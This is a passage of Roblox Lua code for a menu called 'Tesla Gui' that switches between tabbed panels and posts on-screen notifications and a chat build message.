		Closeall() Gamepasses.Visible = true
	end)

	tab6cl.MouseButton1Down:connect(function()
		Closeall() Misc.Visible = true
	end)

	tab4Ga.MouseButton1Down:connect(function()
		Closeall() clothes.Visible = true
	end)

	tab3Ga.MouseButton1Down:connect(function()
		Closeall() Swords.Visible = true
	end)

	tab2Ga.MouseButton1Down:connect(function()
		Closeall() combat.Visible = true
	end)

	tab1Ga.MouseButton1Down:connect(function()
		Closeall() about.Visible = true
	end)

	tab5Ga.MouseButton1Down:connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "Tesla Gui";
			Text = "You're Arealdy On Gamepasses Tab";
			Duration = 7;
		})
	end)

	tab6Ga.MouseButton1Down:connect(function()
		Closeall() Misc.Visible = true
	end)

	tab4Misc.MouseButton1Down:connect(function()
		Closeall() clothes.Visible = true
	end)
	tab3Misc.MouseButton1Down:connect(function()
		Closeall()  Swords.Visible = true
	end)
	tab2Misc.MouseButton1Down:connect(function()
		Closeall() combat.Visible = true
	end)
	tab5Misc.MouseButton1Down:connect(function()
		Closeall()  Gamepasses.Visible = true
	end)
	tab6Misc.MouseButton1Down:connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "Tesla Gui";
			Text = "You're Arealdy On Misc Tab";
			Duration = 7;
		})
	end)

	tab1Misc.MouseButton1Down:connect(function()
		Closeall() about.Visible = true
	end)
end


coroutine.wrap(LFKJCS_fake_script)()


--coisas

game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "Script Build 06/04/24)\nPrivateVersion:\nAE%G42XzB\n Cloud sycn: Not Working\n script build: v2.1";
    Color = Color3.fromRGB(138,43,226);
    Font = Enum.Font.SourceSansBold;
    FontSize = Enum.FontSize.Size96;
})
wait()
